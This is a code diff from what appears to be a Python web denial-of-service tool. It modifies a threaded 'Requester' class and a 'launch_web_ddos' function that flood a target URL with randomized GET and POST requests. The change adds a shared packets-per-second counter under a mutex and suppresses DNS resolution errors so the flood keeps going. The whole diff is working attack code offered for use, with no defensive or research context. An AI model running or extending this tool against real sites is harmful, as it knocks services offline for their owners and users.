@@ -44,12 +44,14 @@ def add_bots():
 	return bots
 
 class Requester(Thread):
-	def __init__(self,tgt):
+	def __init__(self,tgt, packets_per_second, mutex):
 		Thread.__init__(self)
 		self.tgt = tgt
 		self.port = None
 		self.ssl = False
 		self.req = []
+		self.packets = packets_per_second
+		self.mutex = mutex
 		self.lock=Lock()
 		url_type = urllib.parse.urlparse(self.tgt)
 		if url_type.scheme == 'https':
@@ -100,9 +102,13 @@ class Requester(Thread):
 				for reqter in self.req:
 					(url,http_header) = self.data()
 					method = choice(['get','post'])
+					with self.mutex:
+						self.packets.value += 1
 					reqter.request(method.upper(),url,None,http_header)
 			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
+			except gaierror:
+				pass
 			except Exception as e:
 				print (e)
 			finally:
@@ -114,8 +120,8 @@ class Requester(Thread):
 			except:
 				pass
 			
-def launch_web_ddos(target):
+def launch_web_ddos(target, packets_per_second, mutex):
     add_bots()
     add_useragent()
-    t=Requester(target)
+    t=Requester(target, packets_per_second, mutex)
     t.start()
